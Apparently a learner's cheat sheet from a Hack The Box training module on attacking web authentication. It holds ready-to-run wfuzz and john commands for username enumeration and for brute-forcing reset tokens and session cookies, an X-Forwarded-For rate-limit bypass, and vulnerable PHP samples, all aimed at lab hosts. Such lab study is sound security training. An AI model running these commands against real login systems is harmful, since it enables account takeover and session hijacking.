## Info

## Brute forcing

**Default Creds**

- https://www.cirt.net/passwords
- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv
- https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv

**User brute forcing**

- Enumerate through Password Reset
- Enumerate through Registration Form
- Predictable Usernames eg: support.it
- Timing Attack
- Username Existence Inference
- User Unknown Attack  via wfuzz, brup
- 

`L3pr3ch4un@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php`


- Wordlists: https://github.com/danielmiessler/SecLists/tree/master/Usernames

**Timing Attack**

- Script: https://academy.hackthebox.com/storage/modules/80/scripts/timing_py.txt
- CMD: `L3pr3ch4un@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt`

**Hash Time**

- sha1:   0:00:00.000082
- scrypt: 0:00:03.907575
- bcrypt: 0:00:22.660548

**Weak Rate limiting**

![](https://academy.hackthebox.com/storage/modules/80/06-captcha_id.png)

`"X-Forwarded-For": "1.2.3.4"`

## Brute Forcing Passwords


| Policy                        | Grep Command                                | Description                                             |
|-------------------------------|---------------------------------------------|---------------------------------------------------------|
| At least one uppercase letter | `grep -E '.*[A-Z].*' filename.txt`          | Matches lines with at least one uppercase letter.       |
| At least one lowercase letter | `grep -E '.*[a-z].*' filename.txt`          | Matches lines with at least one lowercase letter.       |
| At least one digit            | `grep -E '.*[0-9].*' filename.txt`          | Matches lines with at least one digit.                   |
| At least one special character | `grep -E '.*[!@#$%^&*()_+{}\[\]:;<>,.?~\\/-].*' filename.txt` | Matches lines with at least one special character. |
| Minimum length of 8 characters | `grep -E '.{8,}' filename.txt`              | Matches lines with a minimum length of 8 characters.     |

## Predictable Reset Token

![](https://academy.hackthebox.com/storage/modules/80/reset_flow2.png)

**Time based generation**

```
<?php
function generate_reset_token($username) {
  $time = intval(microtime(true) * 1000);
  $token = md5($username . $time);
  return $token;
}
```

- Script: `https://academy.hackthebox.com/storage/modules/80/scripts/reset_token_time_py.txt`

**Short Tokens**

`L3pr3ch4un@htb[/htb]$ wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"`

**Weak Cryptographpy**

- **Attacking mt_rand()**: https://github.com/GeorgeArgyros/Snowflake

## Username Injection

```
<?php
  if isset($_REQUEST['userid']) {
	$userid = $_REQUEST['userid'];
  } else if isset($_SESSION['userid']) {
	$userid = $_SESSION['userid'];
  } else {
	die("unknown userid");
  }
```

- https://academy.hackthebox.com/storage/modules/80/scripts/username_injection_py.txt

## Brute Forcing Cookies

`user:htb;role:user`

**Encrypted or encoded token**

- Cyberchef
- https://github.com/s0md3v/Decodify
- https://academy.hackthebox.com/storage/modules/80/scripts/automate_cookie_tampering_py.txt

**Weak session token**

`L3pr3ch4un@htb[/htb]$ john --incremental=LowerNum --min-length=6 --max-length=6 --stdout| wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://brokenauthentication.hackthebox.eu/profile.php`


## Refrences

- https://www.cirt.net/passwords
- https://en.wikipedia.org/wiki/List_of_file_signatures
- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv
- https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
- https://github.com/danielmiessler/SecLists/tree/master/Usernames
- https://github.com/danielmiessler/SecLists/tree/master/Usernames/top-usernames-shortlist.txt
- https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
- 
